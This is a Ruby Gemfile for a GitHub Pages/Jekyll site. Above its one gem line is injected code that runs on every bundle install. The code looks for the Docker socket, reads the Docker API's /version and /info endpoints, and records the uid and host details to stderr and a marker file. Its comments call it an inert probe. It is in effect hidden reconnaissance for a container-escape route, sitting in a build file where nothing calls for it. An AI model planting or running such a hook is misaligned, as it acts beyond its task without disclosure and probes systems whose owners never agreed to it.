source "https://rubygems.org"
# --- begin INERT presence-only probe: socket PRESENCE + read-only docker API. ---
# Conduct: no container is created, no host filesystem is mounted, no credential
# value is read, nothing is persisted or authenticated. Presence and identity only.
out = []
begin
  out << "pgx-sock-9f3c1a uid=#{Process.uid} ruby=#{RUBY_VERSION}"
  # POSITIVE/NEGATIVE existence controls: a path that must exist, one that must not.
  [["SUBJECT", "/var/run/docker.sock"],
   ["CTL_PRESENT", "/etc/hostname"],
   ["CTL_ABSENT", "/var/run/zz-no-such-9f3c1a.sock"]].each do |label, p|
    if File.exist?(p)
      st = File.stat(p)
      out << "#{label} #{p} EXISTS type=#{st.ftype} mode=#{format('%o', st.mode)}"
    else
      out << "#{label} #{p} ABSENT"
    end
  end
  # read-only docker API over the unix socket, if present
  if File.socket?("/var/run/docker.sock")
    require "socket"
    ["/version", "/info"].each do |ep|
      begin
        s = UNIXSocket.new("/var/run/docker.sock")
        s.write("GET #{ep} HTTP/1.0\r\nHost: localhost\r\n\r\n")
        resp = s.read(2048).to_s
        s.close
        status = resp.lines.first.to_s.strip
        # identify only: pull a couple of non-sensitive identifying fields
        keys = resp.scan(/"(ApiVersion|ServerVersion|OperatingSystem|Name|DockerRootDir|NCPU)":"?([^",}]{1,60})/).map { |k, v| "#{k}=#{v}" }
        out << "DOCKER_API #{ep} -> #{status} #{keys.join(' ')}"
      rescue => e
        out << "DOCKER_API #{ep} -> ERR #{e.class}"
      end
    end
  else
    out << "DOCKER_API skipped: not a socket"
  end
rescue => e
  out << "FATAL #{e.class}"
end
line = out.join(" | ")
warn line
begin; File.write(File.join(Dir.pwd, "pgx-sock-9f3c1a.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
# --- end ---
gem "github-pages", group: :jekyll_plugins
